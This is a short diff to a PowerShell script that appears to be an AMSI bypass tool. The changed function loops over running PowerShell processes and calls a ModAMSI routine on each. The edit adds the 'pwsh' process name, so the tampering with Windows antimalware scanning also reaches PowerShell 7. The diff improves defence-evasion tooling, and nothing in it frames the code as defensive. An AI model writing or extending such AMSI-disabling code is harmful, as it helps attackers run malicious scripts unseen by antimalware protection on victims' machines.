@@ -155,7 +155,8 @@ function ModAMSI {
 
 function ModAllPShells {
     Write-Host "Modifying all PowerShell processes..." -ForegroundColor Cyan
-    Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
+    # Fixing the search function to account for the newwer powershell process name. 
+    Get-Process | Where-Object { $_.ProcessName -eq "powershell" -or $_.ProcessName -eq "pwsh" } | ForEach-Object {
         Write-Host "Modifying process with ID $_.Id" -ForegroundColor Cyan
         ModAMSI -processId $_.Id
     }
